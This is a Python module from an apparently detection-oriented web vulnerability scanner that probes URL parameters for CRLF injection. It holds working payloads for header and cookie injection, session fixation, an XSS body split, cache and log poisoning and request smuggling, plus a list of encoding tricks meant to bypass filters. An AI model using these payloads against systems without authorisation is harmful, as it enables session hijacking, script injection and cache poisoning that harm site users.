from __future__ import annotations

from . import params, payloads

SEVERITY = {
    "crlf-header": "high",
    "crlf-setcookie": "high",
    "crlf-body": "high",
    "crlf-xfo": "high",
    "crlf-cors": "high",
    "crlf-location": "high",
    "crlf-sessionfix": "high",
    "crlf-cache": "medium",
    "crlf-logpoison": "medium",
    "crlf-smuggling": "medium",
    "crlf-encoded": "high",
}

HOW = {
    "crlf-cache": "crlf-cache-signal",
    "crlf-logpoison": "crlf-logpoison-signal",
    "crlf-smuggling": "crlf-smuggling-signal",
    "crlf-encoded": "crlf-encoded-bypass",
}

MANUAL = ("crlf-cache", "crlf-logpoison", "crlf-smuggling")

CRLF_ENCODINGS = (
    "%0d%0a", "%0a", "%0d", "%23%0d%0a", "%25%30a", "%25%30%61",
    "%u000d%u000a", "%u000a", "%E5%98%8A%E5%98%8D", "%E5%98%8D%E5%98%8A",
    "%c0%8d%c0%8a",
)


def encoded_vectors(marker):
    cookie = "enc-" + marker
    return [("crlf-encoded", enc + "Set-Cookie:" + cookie + "=1", None, cookie)
            for enc in CRLF_ENCODINGS]


def vectors(marker):
    tag = "<svg onload=alert(1)>"
    hname = "x-xpars-" + marker
    cookie = "xpars-" + marker
    sess = "sess-" + marker
    xfo = "x-xpars-xfo-" + marker
    cors = "x-xpars-cors-" + marker
    loc = "x-xpars-loc-" + marker
    cache = "x-xpars-cache-" + marker
    logp = "x-xpars-log-" + marker
    smug = "x-xpars-smug-" + marker
    return [
        ("crlf-header", "\r\n" + hname + ": 1", hname, None),
        ("crlf-setcookie", "\r\nSet-Cookie: " + cookie + "=1", None, cookie),
        ("crlf-body", "\r\nContent-Type: text/html\r\n\r\n" + marker + tag, None, None),
        ("crlf-xfo", "\r\nX-Frame-Options: ALLOWALL\r\n" + xfo + ": 1", xfo, None),
        ("crlf-cors", "\r\nAccess-Control-Allow-Origin: https://xpars-" + marker
         + ".invalid\r\n" + cors + ": 1", cors, None),
        ("crlf-location", "\r\nLocation: https://xpars-" + marker + ".invalid/\r\n"
         + loc + ": 1", loc, None),
        ("crlf-sessionfix", "\r\nSet-Cookie: PHPSESSID=" + sess, None, sess),
        ("crlf-cache", "\r\nCache-Control: public, max-age=31536000\r\n" + cache
         + ": 1", cache, None),
        ("crlf-logpoison", "\r\n[INFO] " + marker + " probe\r\n" + logp + ": 1",
         logp, None),
        ("crlf-smuggling", "\r\nTransfer-Encoding: chunked\r\n" + smug + ": 1",
         smug, None),
    ]


def evaluate(context, hdr_name, cookie_name, marker, resp_headers, body):
    hl = {}
    try:
        for k, v in (resp_headers or {}).items():
            hl[k.lower()] = str(v).lower()
    except Exception:
        pass
    if hdr_name is not None:
        if hdr_name.lower() in hl:
            return "header injected: " + hdr_name
        return None
    if cookie_name is not None:
        if cookie_name.lower() in hl.get("set-cookie", ""):
            return "set-cookie injected: " + cookie_name
        return None
    b = body or ""
    if marker in b and "<svg onload=alert(1)>" in b \
            and "content-type: text/html" not in b.lower():
        return "body split reflected marker"
    return None


def scan_crlf(client, url):
    out = []
    for name in params.injectable(url):
        mk = payloads.marker()
        seen = set()
        for context, value, hdr_name, cookie_name in vectors(mk):
            if context in seen:
                continue
            try:
                resp = client.get(params.set_param(url, name, value))
            except Exception:
                continue
            try:
                body = resp.text
            except Exception:
                body = ""
            ev = evaluate(context, hdr_name, cookie_name, mk, resp.headers, body)
            if not ev:
                continue
            seen.add(context)
            if context in MANUAL:
                ev = ev + " (verify manually)"
            out.append({
                "url": url,
                "param": name,
                "method": "CRLF",
                "context": context,
                "status": getattr(resp, "status_code", 0),
                "payload": value.replace("\r", "\\r").replace("\n", "\\n"),
                "working_payloads": [],
                "evidence": ev,
                "severity": SEVERITY.get(context, "high"),
                "how": HOW.get(context, "crlf-injection"),
                "verified": False,
            })
        for context, raw, hdr_name, cookie_name in encoded_vectors(mk):
            if "crlf-encoded" in seen:
                break
            try:
                resp = client.get(params.set_param_raw(url, name, raw))
            except Exception:
                continue
            try:
                body = resp.text
            except Exception:
                body = ""
            ev = evaluate(context, hdr_name, cookie_name, mk, resp.headers, body)
            if not ev:
                continue
            seen.add(context)
            out.append({
                "url": url,
                "param": name,
                "method": "CRLF",
                "context": context,
                "status": getattr(resp, "status_code", 0),
                "payload": raw,
                "working_payloads": [],
                "evidence": ev + " (encoding bypass)",
                "severity": SEVERITY.get(context, "high"),
                "how": HOW.get(context, "crlf-injection"),
                "verified": False,
            })
    return out
